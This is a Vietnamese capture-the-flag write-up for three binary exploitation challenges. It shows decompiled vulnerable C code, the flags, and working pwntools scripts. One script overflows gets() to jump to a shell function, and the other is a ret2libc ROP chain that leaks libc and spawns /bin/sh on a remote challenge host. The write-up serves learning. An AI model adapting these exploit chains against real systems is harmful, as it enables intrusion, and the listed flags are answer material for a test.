## Gồm các challenge
* Terminal System
* The Portal
* Return that ROPe

## Terminal System
Chỉ cần nhập 1 giá trị đủ lớn để tràn biến V6 != 0 thì có thể get shell.
```sh
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-D8h] BYREF
  char v5[76]; // [rsp+80h] [rbp-58h] BYREF
  int v6; // [rsp+CCh] [rbp-Ch]

  v6 = 0;
  printf("Welcome to the demo of the Terminal System.\nWhat is your username: ");
  fflush(_bss_start);
  gets(v5, argv);
  printf("\nHello %s, what is your password: ", v5);
  fflush(_bss_start);
  gets(&v4, v5);
  if ( v6 )
  {
    printf("\nWelcome back %s!", v5);
    putchar(10);
    execve("/bin/sh", 0LL, 0LL);
  }
  else
  {
    printf("\nAccess denied!");
  }
  putchar(10);
  return 0;
}
```
### flag{t3rm1n4l_syst3m_0v3rfl0w}

## The Portal

Tại challenge này có 1 hàm gọi sẵn system
```sh
int portal()
{
  return system("/bin/sh");
}
```
Tràn main_ret = portal_address --> done
```sh
from pwn import *
host = "challenges.ctf.cert.rcts.pt"
port = 57449
s = remote(host,port)
# s = process("./program")
raw_input("debug_zir")
payload = "a"*0x28 + p64(0x0401156)
s.sendline(payload)
s.interactive()
#flag{0p3n1ng_p0rt4ls_w1th_buff3r_0v3rfl0w}
```

## Return that ROPe

Trong main sẽ gọi ret(), trong hàm ret() dùng gets() --> buffer overflow.
```sh
__int64 ret()
{
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Can you ROP it?");
  fflush(_bss_start);
  return gets(v1);
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("Welcome to Return Oriented Programming.");
  ret();
  return 0;
}
``` 

Bài này sẽ dùng kỹ thuật Ret2libc để giải quyết như sau:
* Leak libc, quay lại hàm ret().
* Tính libc_base, system, binsh, get shell.

file exploit
```sh
from pwn import *
# s = process("./program")
s = remote("challenges.ctf.cert.rcts.pt",40700)
elf = ELF("./program")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
RET_FUNC = 0x401142
RET = 0x401016
POPRDI_RET = 0x4011fb
payload = 'A'*0x28
payload += p64(POPRDI_RET)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(RET)
payload += p64(RET_FUNC)


s.sendline(payload)
s.recv()
# s.recvuntil("Can you ROP it?\n")

puts_leak = u64(s.recv(6)+"\x00\x00")
libc.address = puts_leak - libc.symbols['puts']
system = libc.symbols['system']
binsh = next(libc.search("/bin/sh"))

print "libc >> " + hex(libc.address)
print "system >> " + hex(system)
print "binsh >> " + hex(binsh)

payload2 = 'A'*0x28
payload2 += p64(POPRDI_RET)
payload2 += p64(binsh)
payload2 += p64(system)

s.sendline(payload2)
s.interactive()

#flag{r0p_b1n4ry_3xpl01t4t10n}
```
